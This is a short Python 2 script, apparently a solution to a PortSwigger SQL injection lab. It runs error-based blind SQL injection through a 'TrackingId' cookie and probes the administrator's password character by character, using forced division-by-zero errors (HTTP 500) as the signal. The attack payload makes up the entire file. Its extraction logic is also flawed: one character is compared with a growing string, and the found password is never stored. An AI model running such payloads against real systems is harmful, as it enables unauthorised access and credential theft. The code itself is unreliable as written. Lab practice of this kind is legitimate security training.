import sys
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url = sys.argv[1]
password = ""
wordlist = "/root/PortSwigger/scripts/letters.txt"

x = range(1,7)
for i in x:
    letters=open(wordlist,"r")
    for l in letters.readlines():
        letter = l.strip()
        cookies={'TrackingId':'\'+UNION+SELECT+CASE+WHEN+(username=\'administrator\'+AND+substr(password,%s,1)=\'%s\')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--' % (i,password+letter)} 
        out = requests.get(url,cookies=cookies)
        if out.status_code == 500:
            print "[+] Found char: %s" % password+letter
